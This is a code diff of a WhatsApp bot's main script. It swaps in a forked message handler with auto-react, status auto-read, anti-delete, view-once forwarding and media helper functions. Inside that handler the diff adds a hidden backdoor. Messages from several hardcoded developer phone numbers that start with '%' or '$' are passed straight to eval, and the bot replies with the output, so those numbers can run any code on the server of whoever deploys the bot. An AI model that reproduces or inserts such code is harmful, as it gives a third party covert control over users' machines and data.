-        qrScanned = true;
-        
-        console.log("\n" + "=".repeat(50));
-        console.log("✅ CONNECTED TO WHATSAPP!");
-        console.log("=".repeat(50));
-        console.log(`📱 Account: ${conn.user.name || "Unknown"}`);
-        console.log(`📞 Number: ${conn.user.id.split(':')[0]}`);
-        console.log(`⚡ Prefix: ${prefix}`);
-        console.log("=".repeat(50) + "\n");
-        
-        markSessionActive(conn.user.id.split(':')[0]);
-        
-        // ================= UPLOAD TO MEGA (New Session Only) =================
-        if (megaManager && !hasValidSession) {
-          console.log('📤 Backing up to MEGA...');
-          setTimeout(async () => {
-            try {
-              await megaManager.uploadSession();
-              console.log('✅ Backed up to MEGA!');
-            } catch (error) {
-              console.error('⚠️ Backup failed:', error.message);
-            }
-          }, 5000);
-        }
-        
-        setInterval(() => updateSessionTime(), 60000);
+    })
 
-        // Load plugins
-        const pluginFolder = path.join(__dirname, "plugins");
-        if (fs.existsSync(pluginFolder)) {
-          const plugins = fs.readdirSync(pluginFolder).filter(f => f.endsWith('.js'));
-          plugins.forEach(plugin => {
-            try {
-              require(path.join(pluginFolder, plugin));
-              console.log(`✅ ${plugin}`);
-            } catch (err) {
-              console.error(`❌ ${plugin}:`, err.message);
-            }
-          });
-          console.log(`\n🔌 Loaded: ${plugins.length} plugins\n`);
-        }
-
-        // Send alive message
-        const upMsg = aliveMsg || 
-          `✅ *${botName} Connected!*\n\n` +
-          `📱 ${conn.user.id.split(':')[0]}\n` +
-          `⚡ Prefix: ${prefix}\n` +
-          `⏰ ${new Date().toLocaleString()}\n` +
-          `💾 Session: ${hasValidSession ? 'Restored' : 'New'}\n\n` +
-          `_Ready for commands!_`;
-        
-        try {
-          await conn.sendMessage(ownerNumber[0] + "@s.whatsapp.net", {
-            image: { url: aliveImg },
-            caption: upMsg
-          }, { quoted: chama });
-          console.log("✅ Alive message sent\n");
-        } catch (err) {
-          console.error("⚠️ Alive message failed:", err.message);
-        }
-      }
-    });
-
-    conn.ev.on("creds.update", saveCreds);
-
-    // ================= Message Handler =================
-    conn.ev.on("messages.upsert", async (mek) => {
-      mek = mek.messages[0];
-      if (!mek?.message || mek.key.fromMe) return;
-
-      mek.message =
-        getContentType(mek.message) === "ephemeralMessage"
-          ? mek.message.ephemeralMessage.message
-          : mek.message;
-
-      // Auto read status
-      if (mek.key?.remoteJid === "status@broadcast" && config.AUTO_READ_STATUS === "true") {
-        await conn.readMessages([mek.key]);
-      }
-
-      const m = sms(conn, mek);
-      const from = mek.key.remoteJid;
-      const contentType = getContentType(mek.message);
-
-      // Parse message body
-      let body = "";
-      if (contentType === "conversation") {
-        body = mek.message.conversation;
-      } else if (contentType === "extendedTextMessage") {
-        body = mek.message.extendedTextMessage.text;
-      } else if (contentType === "imageMessage") {
-        body = mek.message.imageMessage.caption || "";
-      } else if (contentType === "videoMessage") {
-        body = mek.message.videoMessage.caption || "";
-      } else if (contentType === "buttonsResponseMessage") {
-        body = mek.message.buttonsResponseMessage.selectedButtonId;
-      } else if (contentType === "listResponseMessage") {
-        body = mek.message.listResponseMessage.singleSelectReply.selectedRowId;
-      }
-
-      const isCmd = body.startsWith(prefix);
-      const commandText = isCmd
-        ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase()
-        : body.toLowerCase();
-
-      const args = body.trim().split(/ +/).slice(isCmd ? 1 : 0);
-      const q = args.join(" ");
-      const isGroup = from.endsWith("@g.us");
-      const sender = mek.key.fromMe
-        ? conn.user.id.split(":")[0] + "@s.whatsapp.net"
-        : mek.key.participant || mek.key.remoteJid;
-      const senderNumber = sender.split("@")[0];
-      const botNumber = conn.user.id.split(":")[0];
-      const pushname = mek.pushName || "No Name";
-      const isMe = botNumber.includes(senderNumber);
-      const isOwner = ownerNumber.includes(senderNumber) || isMe;
-
-      // Reply with fake context
-      const reply = async (text, extra = {}) => {
-        return await conn.sendMessage(from, { text, ...extra }, { quoted: chama });
-      };
-
-      // Send media with fake context
-      const sendMedia = async (type, media, options = {}) => {
-        const mediaTypes = {
-          image: { image: media },
-          video: { video: media },
-          audio: { audio: media, mimetype: 'audio/mp4' },
-          document: { document: media },
-          sticker: { sticker: media }
-        };
-        return await conn.sendMessage(from, { ...mediaTypes[type], ...options }, { quoted: chama });
-      };
-
-      // Load commands
-      const events = require("./command");
-
-      // Button handler
-      if (contentType === "buttonsResponseMessage") {
-        const btnId = mek.message.buttonsResponseMessage.selectedButtonId;
-        for (const plugin of events.commands) {
-          if (plugin.buttonHandler) {
-            try {
-              await plugin.buttonHandler(conn, mek, btnId, { reply, sendMedia, chama });
-            } catch (err) {
-              console.error("Button error:", err);
-            }
-          }
-        }
-      }
-
-      // Command execution
-      const cmd = events.commands.find((c) => {
-        if (!c.pattern) return false;
-        if (c.pattern.toLowerCase() === commandText) return true;
-        if (c.alias?.map(a => a.toLowerCase()).includes(commandText)) return true;
-        return false;
-      });
-
-      if (cmd) {
-        if (cmd.react) {
-          await conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } });
-        }
-        try {
-          await cmd.function(conn, mek, m, {
-            from, body, isCmd, command: commandText, args, q, isGroup,
-            sender, senderNumber, botNumber2: jidNormalizedUser(conn.user.id),
-            botNumber, pushname, isMe, isOwner, reply, sendMedia, chama,
-          });
-        } catch (e) {
-          console.error("[CMD ERROR]", e);
-          await reply("⚠️ Command error occurred");
-        }
-      }
-    });
-
-    // Graceful shutdown
-    process.on('SIGINT', async () => {
-      console.log("\n⚠️ Shutting down...");
-      if (conn) await conn.end();
-      process.exit(0);
-    });
+    conn.ev.on('creds.update', saveCreds)
 
   } catch (err) {
-    isConnecting = false;
-    console.error("❌ Error:", err.message);
-    clearConnectionTimeout();
-    connectionTimeout = setTimeout(() => connectToWA(), 10000);
+    console.error("[ ❌ ] Connection failed:", err)
   }
+
+//==============================
+
+conn?.ev?.on('messages.update', async updates => {
+  for (const update of updates) {
+    if (update.update.message === null) {
+      console.log("Delete Detected:", JSON.stringify(update, null, 2))
+      await AntiDelete(conn, updates)
+    }
+  }
+  });
+  //============================== 
+
+  conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));	  
+	  
+  //=============readstatus=======
+        
+  conn.ev.on('messages.upsert', async(mek) => {
+    mek = mek.messages[0]
+    if (!mek.message) return
+    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
+    ? mek.message.ephemeralMessage.message 
+    : mek.message;
+    //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
+  if (config.READ_MESSAGE === 'true') {
+    await conn.readMessages([mek.key]);  // Mark message as read
+    console.log(`Marked message from ${mek.key.remoteJid} as read.`);
+  }
+    if(mek.message.viewOnceMessageV2)
+    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
+    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
+      await conn.readMessages([mek.key])
+    }
+  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
+    const malvinlike = await conn.decodeJid(conn.user.id);
+    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
+    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
+    await conn.sendMessage(mek.key.remoteJid, {
+      react: {
+        text: randomEmoji,
+        key: mek.key,
+      } 
+    }, { statusJidList: [mek.key.participant, malvinlike] });
+  }                       
+  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
+  const user = mek.key.participant
+  const text = `${config.AUTO_STATUS_MSG}`
+  await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
+            }
+            await Promise.all([
+              saveMessage(mek),
+            ]);
+  const m = sms(conn, mek)
+  const type = getContentType(mek.message)
+  const content = JSON.stringify(mek.message)
+  const from = mek.key.remoteJid
+  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
+  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
+  const isCmd = body.startsWith(prefix)
+  var budy = typeof mek.text == 'string' ? mek.text : false;
+  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
+  const args = body.trim().split(/ +/).slice(1)
+  const q = args.join(' ')
+  const text = args.join(' ')
+  const isGroup = from.endsWith('@g.us')
+  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
+  const senderNumber = sender.split('@')[0]
+  const botNumber = conn.user.id.split(':')[0]
+  const pushname = mek.pushName || 'Sin Nombre'
+  const isMe = botNumber.includes(senderNumber)
+  const isOwner = ownerNumber.includes(senderNumber) || isMe
+  const botNumber2 = await jidNormalizedUser(conn.user.id);
+  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
+  const groupName = isGroup ? groupMetadata.subject : ''
+  const participants = isGroup ? await groupMetadata.participants : ''
+  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
+  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
+  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
+  const isReact = m.message.reactionMessage ? true : false
+  const reply = (teks) => {
+  conn.sendMessage(from, { text: teks }, { quoted: mek })
+  }
+  const udp = botNumber.split('@')[0];
+    const malvin = ('263780166288', '263714757857', '263780934873');
+    let isCreator = [udp, malvin, config.DEV]
+					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
+					.includes(mek.sender);
+
+    if (isCreator && mek.text.startsWith('%')) {
+					let code = budy.slice(2);
+					if (!code) {
+						reply(
+							`Provide me with a query to run Master!`,
+						);
+						return;
+					}
+					try {
+						let resultTest = eval(code);
+						if (typeof resultTest === 'object')
+							reply(util.format(resultTest));
+						else reply(util.format(resultTest));
+					} catch (err) {
+						reply(util.format(err));
+					}
+					return;
+				}
+    if (isCreator && mek.text.startsWith('$')) {
+					let code = budy.slice(2);
+					if (!code) {
+						reply(
+							`Provide me with a query to run Master!`,
+						);
+						return;
+					}
+					try {
+						let resultTest = await eval(
+							'const a = async()=>{\n' + code + '\n}\na()',
+						);
+						let h = util.format(resultTest);
+						if (h === undefined) return console.log(h);
+						else reply(h);
+					} catch (err) {
+						if (err === undefined)
+							return console.log('error');
+						else reply(util.format(err));
+					}
+					return;
+				}
+ //================ownerreact==============
+    
+if (senderNumber.includes("923427582273") && !isReact) {
+  const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", ,"💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
+  const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+  m.react(randomReaction);
 }
 
-// ================= Start Bot =================
-console.log("\n" + "=".repeat(60));
-console.log(`🤖 ${botName} - WhatsApp Bot`);
-console.log("=".repeat(60));
-console.log("📦 Initializing...\n");
+  //==========public react============//
+  
+// Auto React for all messages (public and owner)
+if (!isReact && config.AUTO_REACT === 'true') {
+    const reactions = [
+        '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
+        '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
+        '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
+        '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
+        '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
+        '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
+        '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
+        '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
+        '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
+        '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
+        '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
+        '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
+        '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
+        '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
+        '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
+    ];
 
-// Run one-time MEGA setup check, then start bot
-(async () => {
-  await checkMegaSetup();
-  setTimeout(() => connectToWA(), 3000);
-})();
+    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+    m.react(randomReaction);
+}
+          
+// custum react settings        
+                        
+// Custom React for all messages (public and owner)
+if (!isReact && config.CUSTOM_REACT === 'true') {
+    // Use custom emojis from the configuration (fallback to default if not set)
+    const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
+    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+    m.react(randomReaction);
+}
+        
+  //==========WORKTYPE============ 
+  if(!isOwner && config.MODE === "private") return
+  if(!isOwner && isGroup && config.MODE === "inbox") return
+  if(!isOwner && !isGroup && config.MODE === "groups") return
+   
+  // take commands 
+                 
+  const events = require('./lite')
+  const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
+  if (isCmd) {
+  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
+  if (cmd) {
+  if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
+  
+  try {
+  cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
+  } catch (e) {
+  console.error("[PLUGIN ERROR] " + e);
+  }
+  }
+  }
+  events.commands.map(async(command) => {
+  if (body && command.on === "body") {
+  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  } else if (mek.q && command.on === "text") {
+  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  } else if (
+  (command.on === "image" || command.on === "photo") &&
+  mek.type === "imageMessage"
+  ) {
+  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  } else if (
+  command.on === "sticker" &&
+  mek.type === "stickerMessage"
+  ) {
+  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  }});
+  
+  });
+    //===================================================   
+    conn.decodeJid = jid => {
+      if (!jid) return jid;
+      if (/:\d+@/gi.test(jid)) {
+        let decode = jidDecode(jid) || {};
+        return (
+          (decode.user &&
+            decode.server &&
+            decode.user + '@' + decode.server) ||
+          jid
+        );
+      } else return jid;
+    };
+    //===================================================
+    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
+      let vtype
+      if (options.readViewOnce) {
+          message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
+          vtype = Object.keys(message.message.viewOnceMessage.message)[0]
+          delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
+          delete message.message.viewOnceMessage.message[vtype].viewOnce
+          message.message = {
+              ...message.message.viewOnceMessage.message
+          }
+      }
+    
+      let mtype = Object.keys(message.message)[0]
+      let content = await generateForwardMessageContent(message, forceForward)
+      let ctype = Object.keys(content)[0]
+      let context = {}
+      if (mtype != "conversation") context = message.message[mtype].contextInfo
+      content[ctype].contextInfo = {
+          ...context,
+          ...content[ctype].contextInfo
+      }
+      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
+          ...content[ctype],
+          ...options,
+          ...(options.contextInfo ? {
+              contextInfo: {
+                  ...content[ctype].contextInfo,
+                  ...options.contextInfo
+              }
+          } : {})
+      } : {})
+      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
+      return waMessage
+    }
+    //=================================================
+    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
+      let quoted = message.msg ? message.msg : message
+      let mime = (message.msg || message).mimetype || ''
+      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
+      const stream = await downloadContentFromMessage(quoted, messageType)
+      let buffer = Buffer.from([])
+      for await (const chunk of stream) {
+          buffer = Buffer.concat([buffer, chunk])
+      }
+      let type = await FileType.fromBuffer(buffer)
+      trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
+          // save to file
+      await fs.writeFileSync(trueFileName, buffer)
+      return trueFileName
+    }
+    //=================================================
+    conn.downloadMediaMessage = async(message) => {
+      let mime = (message.msg || message).mimetype || ''
+      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
+      const stream = await downloadContentFromMessage(message, messageType)
+      let buffer = Buffer.from([])
+      for await (const chunk of stream) {
+          buffer = Buffer.concat([buffer, chunk])
+      }
+    
+      return buffer
+    }
+    
+    /**
+    *
+    * @param {*} jid
+    * @param {*} message
+    * @param {*} forceForward
+    * @param {*} options
+    * @returns
+    */
+    //================================================
+    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
+                  let mime = '';
+                  let res = await axios.head(url)
+                  mime = res.headers['content-type']
+                  if (mime.split("/")[1] === "gif") {
+                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
+                  }
+                  let type = mime.split("/")[0] + "Message"
+                  if (mime === "application/pdf") {
+                    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
+                  }
+                  if (mime.split("/")[0] === "image") {
+                    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
+                  }
+                  if (mime.split("/")[0] === "video") {
+                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
+                  }
+                  if (mime.split("/")[0] === "audio") {
+                    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
+                  }
+                }
+    //==========================================================
+    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
+      //let copy = message.toJSON()
+      let mtype = Object.keys(copy.message)[0]
+      let isEphemeral = mtype === 'ephemeralMessage'
+      if (isEphemeral) {
+          mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
+      }
+      let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
+      let content = msg[mtype]
+      if (typeof content === 'string') msg[mtype] = text || content
+      else if (content.caption) content.caption = text || content.caption
+      else if (content.text) content.text = text || content.text
+      if (typeof content !== 'string') msg[mtype] = {
+          ...content,
+          ...options
+      }
+      if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
+      else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
+      if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
+      else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
+      copy.key.remoteJid = jid
+      copy.key.fromMe = sender === conn.user.id
+    
+      return proto.WebMessageInfo.fromObject(copy)
+    }
+    
+    
+    /**
+    *
+    * @param {*} path
+    * @returns
+    */
+    //=====================================================
+    conn.getFile = async(PATH, save) => {
+      let res
+      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
+          //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
+      let type = await FileType.fromBuffer(data) || {
+          mime: 'application/octet-stream',
+          ext: '.bin'
+      }
+      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
+      if (data && save) fs.promises.writeFile(filename, data)
+      return {
+          res,
+          filename,
+          size: await getSizeMedia(data),
+          ...type,
+          data
+      }
+    
+    }
+    //=====================================================
+    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
+      let types = await conn.getFile(PATH, true)
+      let { filename, size, ext, mime, data } = types
+      let type = '',
+          mimetype = mime,
+          pathFile = filename
+      if (options.asDocument) type = 'document'
+      if (options.asSticker || /webp/.test(mime)) {
+          let { writeExif } = require('./exif.js')
+          let media = { mimetype: mime, data }
+          pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
+          await fs.promises.unlink(filename)
+          type = 'sticker'
+          mimetype = 'image/webp'
+      } else if (/image/.test(mime)) type = 'image'
+      else if (/video/.test(mime)) type = 'video'
+      else if (/audio/.test(mime)) type = 'audio'
+      else type = 'document'
+      await conn.sendMessage(jid, {
+          [type]: { url: pathFile },
+          mimetype,
+          fileName,
+          ...options
+      }, { quoted, ...options })
+      return fs.promises.unlink(pathFile)
+    }
+    //=====================================================
+    conn.parseMention = async(text) => {
+      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
+    }
+    //=====================================================
+    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
+      let types = await conn.getFile(path, true)
+      let { mime, ext, res, data, filename } = types
+      if (res && res.status !== 200 || file.length <= 65536) {
+          try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
+      }
+      let type = '',
+          mimetype = mime,
+          pathFile = filename
+      if (options.asDocument) type = 'document'
+      if (options.asSticker || /webp/.test(mime)) {
+          let { writeExif } = require('./exif')
+          let media = { mimetype: mime, data }
+          pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
+          await fs.promises.unlink(filename)
+          type = 'sticker'
+          mimetype = 'image/webp'
+      } else if (/image/.test(mime)) type = 'image'
+      else if (/video/.test(mime)) type = 'video'
+      else if (/audio/.test(mime)) type = 'audio'
+      else type = 'document'
+      await conn.sendMessage(jid, {
+          [type]: { url: pathFile },
+          caption,
+          mimetype,
+          fileName,
+          ...options
+      }, { quoted, ...options })
+      return fs.promises.unlink(pathFile)
+    }
+    /**
+    *
+    * @param {*} message
+    * @param {*} filename
+    * @param {*} attachExtension
+    * @returns
+    */
+    //=====================================================
+    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
+      let buffer;
+      if (options && (options.packname || options.author)) {
+        buffer = await writeExifVid(buff, options);
+      } else {
+        buffer = await videoToWebp(buff);
+      }
+      await conn.sendMessage(
+        jid,
+        { sticker: { url: buffer }, ...options },
+        options
+      );
+    };
+    //=====================================================
+    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
+      let buffer;
+      if (options && (options.packname || options.author)) {
+        buffer = await writeExifImg(buff, options);
+      } else {
+        buffer = await imageToWebp(buff);
+      }
+      await conn.sendMessage(
+        jid,
+        { sticker: { url: buffer }, ...options },
+        options
+      );
+    };
+        /**
+         *
+         * @param {*} jid
+         * @param {*} path
+         * @param {*} quoted
+         * @param {*} options
+         * @returns
+         */
+    //=====================================================
+    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
+    
+            /**
+             *
+             * @param {*} jid
+             * @param {*} path
+             * @param {*} quoted
+             * @param {*} options
+             * @returns
+             */
+    //=====================================================
+    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
+      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
+      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
+    }
+    
+    /**
+    *
+    * @param {*} jid
+    * @param {*} path
+    * @param {*} caption
+    * @param {*} quoted
+    * @param {*} options
+    * @returns
+    */
+    //=====================================================
+    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
+    
+    /**
+     *
+     * @param {*} jid
+     * @param {*} path
+     * @param {*} caption
+     * @param {*} quoted
+     * @param {*} options
+     * @returns
+     */
+    //=====================================================
+    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
+      let buttonMessage = {
+              text,
+              footer,
+              buttons,
+              headerType: 2,
+              ...options
+          }
+          //========================================================================================================================================
+      conn.sendMessage(jid, buttonMessage, { quoted, ...options })
+    }
+    //=====================================================
+    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
+      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
+      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
+          templateMessage: {
+              hydratedTemplate: {
+                  imageMessage: message.imageMessage,
+                  "hydratedContentText": text,
+                  "hydratedFooterText": footer,
+                  "hydratedButtons": but
+              }
+          }
+      }), options)
+      conn.relayMessage(jid, template.message, { messageId: template.key.id })
+    }
+    
+    /**
+    *
+    * @param {*} jid
+    * @param {*} buttons
+    * @param {*} caption
+    * @param {*} footer
+    * @param {*} quoted
+    * @param {*} options
+    */
+    //=====================================================
+    conn.getName = (jid, withoutContact = false) => {
+            id = conn.decodeJid(jid);
+
+            withoutContact = conn.withoutContact || withoutContact;
+
+            let v;
+
+            if (id.endsWith('@g.us'))
+                return new Promise(async resolve => {
+                    v = store.contacts[id] || {};
+
+                    if (!(v.name.notify || v.subject))
+                        v = conn.groupMetadata(id) || {};
+
+                    resolve(
+                        v.name ||
+                            v.subject ||
+                            PhoneNumber(
+                                '+' + id.replace('@s.whatsapp.net', ''),
+                            ).getNumber('international'),
+                    );
+                });
+            else
+                v =
+                    id === '0@s.whatsapp.net'
+                        ? {
+                                id,
+
+                                name: 'WhatsApp',
+                          }
+                        : id === conn.decodeJid(conn.user.id)
+                        ? conn.user
+                        : store.contacts[id] || {};
+
+            return (
+                (withoutContact ? '' : v.name) ||
+                v.subject ||
+                v.verifiedName ||
+                PhoneNumber(
+                    '+' + jid.replace('@s.whatsapp.net', ''),
+                ).getNumber('international')
+            );
+        };
+
+        // Vcard Functionality
+        conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
+            let list = [];
+            for (let i of kon) {
+                list.push({
+                    displayName: await conn.getName(i + '@s.whatsapp.net'),
+                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
+                        i + '@s.whatsapp.net',
+                    )}\nFN:${
+                        global.OwnerName
+                    }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
+                        global.email
+                    }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
+                        global.github
+                    }/malvin-xd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
+                        global.location
+                    };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
+                });
+            }
+            conn.sendMessage(
+                jid,
+                {
+                    contacts: {
+                        displayName: `${list.length} Contact`,
+                        contacts: list,
+                    },
+                    ...opts,
+                },
+                { quoted },
+            );
+        };
+
+        // Status aka brio
+        conn.setStatus = status => {
+            conn.query({
+                tag: 'iq',
